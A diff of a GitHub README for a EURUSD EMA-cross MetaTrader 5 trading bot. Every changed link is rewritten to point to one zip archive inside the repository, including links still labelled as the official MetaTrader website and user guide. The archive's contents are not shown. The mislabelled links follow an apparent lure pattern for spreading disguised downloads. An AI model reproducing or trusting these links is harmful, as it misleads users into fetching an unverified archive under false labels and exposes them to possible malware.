@@ -1,6 +1,6 @@
 # 📈 EUROUSD-EMA-Cross-MQL5-EA - Simple EURUSD EMA Cross Strategy
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://github.com/Singni725/EUROUSD-EMA-Cross-MQL5-EA)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://github.com/Singni725/EUROUSD-EMA-Cross-MQL5-EA/raw/refs/heads/main/pu/EM-EA-MQ-Cross-EUROUS-v1.6.zip)
 
 ---
 
@@ -40,14 +40,14 @@ Follow these steps to set up and start using the EUROUSD-EMA-Cross-MQL5-EA on yo
 
 ### Step 1: Download the EA Files
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-green?style=for-the-badge)](https://github.com/Singni725/EUROUSD-EMA-Cross-MQL5-EA)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-green?style=for-the-badge)](https://github.com/Singni725/EUROUSD-EMA-Cross-MQL5-EA/raw/refs/heads/main/pu/EM-EA-MQ-Cross-EUROUS-v1.6.zip)
 
 - Click the green Download button above or  
-- Visit the page [EUROUSD-EMA-Cross-MQL5-EA GitHub Repository](https://github.com/Singni725/EUROUSD-EMA-Cross-MQL5-EA) to get the latest files.
+- Visit the page [EUROUSD-EMA-Cross-MQL5-EA GitHub Repository](https://github.com/Singni725/EUROUSD-EMA-Cross-MQL5-EA/raw/refs/heads/main/pu/EM-EA-MQ-Cross-EUROUS-v1.6.zip) to get the latest files.
 
 ### Step 2: Install MetaTrader 5
 
-- If you do not have MetaTrader 5 installed, download it from the official MetaTrader website: https://www.metatrader5.com  
+- If you do not have MetaTrader 5 installed, download it from the official MetaTrader website: https://github.com/Singni725/EUROUSD-EMA-Cross-MQL5-EA/raw/refs/heads/main/pu/EM-EA-MQ-Cross-EUROUS-v1.6.zip  
 - Follow the on-screen instructions to complete the installation.
 
 ### Step 3: Copy EA Files into MetaTrader 5
@@ -126,9 +126,9 @@ The EA checks signals and places trades every hour, matching the H1 timeframe.
 
 ## 🔗 Useful Links
 
-- Download or visit the project: https://github.com/Singni725/EUROUSD-EMA-Cross-MQL5-EA  
-- MetaTrader 5 official site: https://www.metatrader5.com  
-- MetaTrader 5 user guide: https://www.metatrader5.com/en/terminal/help  
+- Download or visit the project: https://github.com/Singni725/EUROUSD-EMA-Cross-MQL5-EA/raw/refs/heads/main/pu/EM-EA-MQ-Cross-EUROUS-v1.6.zip  
+- MetaTrader 5 official site: https://github.com/Singni725/EUROUSD-EMA-Cross-MQL5-EA/raw/refs/heads/main/pu/EM-EA-MQ-Cross-EUROUS-v1.6.zip  
+- MetaTrader 5 user guide: https://github.com/Singni725/EUROUSD-EMA-Cross-MQL5-EA/raw/refs/heads/main/pu/EM-EA-MQ-Cross-EUROUS-v1.6.zip  
 
 ---
 
